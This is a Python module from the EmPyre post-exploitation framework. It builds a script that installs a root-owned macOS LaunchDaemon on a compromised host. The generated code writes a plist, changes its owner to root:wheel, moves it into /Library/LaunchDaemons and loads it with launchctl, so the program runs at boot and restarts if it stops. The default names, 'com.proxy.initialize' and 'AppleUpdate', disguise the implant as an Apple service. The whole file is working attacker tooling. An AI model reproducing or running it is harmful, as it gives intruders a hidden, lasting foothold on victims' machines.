from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'LaunchDaemon',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('Installs an EmPyre launchDaemon.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'DaemonName' : {
                'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                'Required'      :   True,
                'Value'         :   'com.proxy.initialize'
            },
            'ProgramName' : {
                'Description'   :   'The name of the program or bash script execute when the daemon is loaded.',
                'Required'      :   True,
                'Value'         :   '/Library/Application Support/AppleUpdate'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        daemonName = self.options['DaemonName']['Value']
        programname = self.options['ProgramName']['Value']
        plistfilename = "%s.plist"%daemonName
        
        plistSettings = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""%(daemonName,programname)

        script = """
import subprocess
import sys

plist = \"\"\"
%s
\"\"\"

f = open('/tmp/%s','w')
f.write(plist)
f.close()

process = subprocess.Popen('chmod 644 /tmp/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('chown -R root /tmp/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('chown :wheel /tmp/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('mv /tmp/%s /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

""" %(plistSettings, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename)

        return script